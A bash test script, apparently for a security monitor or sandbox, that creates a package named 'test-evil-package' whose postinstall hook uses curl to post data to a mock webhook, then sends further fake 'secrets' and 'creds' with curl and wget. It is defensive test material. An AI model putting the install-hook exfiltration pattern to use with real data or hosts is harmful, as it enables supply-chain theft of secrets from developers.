#!/usr/bin/env bash
set -e

# Scenario 1: Malicious Postinstall Script Execution

WORKDIR="test-malicious-package"
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

WEBHOOK_TARGET="${MOCK_WEBHOOK:-http://localhost:8080/webhook-receiver}"

cat > package.json <<EOF
{
  "name": "test-evil-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -d 'test=data' '${WEBHOOK_TARGET}' || echo 'Mock exfiltration attempt'"
  },
  "dependencies": {}
}
EOF

echo "Installing to trigger postinstall..."
npm config set fund false >/dev/null 2>&1 || true
npm config set audit false >/dev/null 2>&1 || true
npm install || true

echo "Alt variations..."
npm init -y >/dev/null 2>&1 || true
timeout 5 npm install --save test-package 2>/dev/null || echo "test-package install skipped (expected)"
curl -d "secrets=fake" "${WEBHOOK_TARGET}" || true

if command -v yarn >/dev/null 2>&1; then
  timeout 5 yarn add test-package 2>/dev/null || echo "yarn test-package skipped (expected)"
fi

if command -v wget >/dev/null 2>&1; then
  wget --post-data="creds=test" "${WEBHOOK_TARGET}" -O /dev/null || true
fi

echo "Scenario 1 complete"

